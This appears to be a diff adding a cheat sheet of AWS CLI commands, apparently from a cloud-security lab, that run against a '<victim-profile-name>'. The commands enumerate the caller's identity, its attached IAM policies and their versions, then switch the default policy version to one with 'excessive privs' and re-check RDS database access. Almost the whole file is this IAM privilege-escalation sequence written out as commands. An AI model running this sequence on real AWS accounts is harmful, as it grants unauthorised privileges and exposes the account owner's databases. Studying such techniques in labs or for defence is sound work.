@@ -1,0 +1,29 @@
+aws rds describe-db-instances --region us-east-1 --profile <victim-profile-name>
+
+aws sts get-caller-identity --profile <victim-profile-name>
+
+aws iam list-attached-user-policies --user-name <victim-aws-user-name> --profile <victim-profile-name>
+
+aws iam get-policy --policy-arn "<arn-value-of-policy>" --profile <victim-profile-name>
+
+aws iam get-policy-version --policy-arn "<arn-value-of-policy>" --version-id v3 --profile <victim-
+profile-name>
+
+aws iam list-policy-versions --policy-arn "<arn-value-of-policy>" --profile <victim-profile-name>
+
+aws iam get-policy-version --policy-arn "<arn-value-of-policy>" --version-id v1 --profile <victim-
+profile-name>
+aws iam get-policy-version --policy-arn "<arn-value-of-policy>" --version-id v2 --profile <victim-
+profile-name>
+aws iam get-policy-version --policy-arn "<arn-value-of-policy>" --version-id v4 --profile <victim-
+profile-name>
+aws iam get-policy-version --policy-arn "<arn-value-of-policy>" --version-id v5 --profile <victim-
+profile-name>
+aws iam set-default-policy-version --policy-arn "<arn-value-of-policy>" --version-id <version-with-
+excessive-privs> --profile <victim-profile-name>
+
+
+aws rds describe-db-instances --region us-east-1 --profile <victim-profile-name>
+
+aws iam get-policy --policy-arn "<arn-value-of-policy>" --profile <victim-profile-name>
+
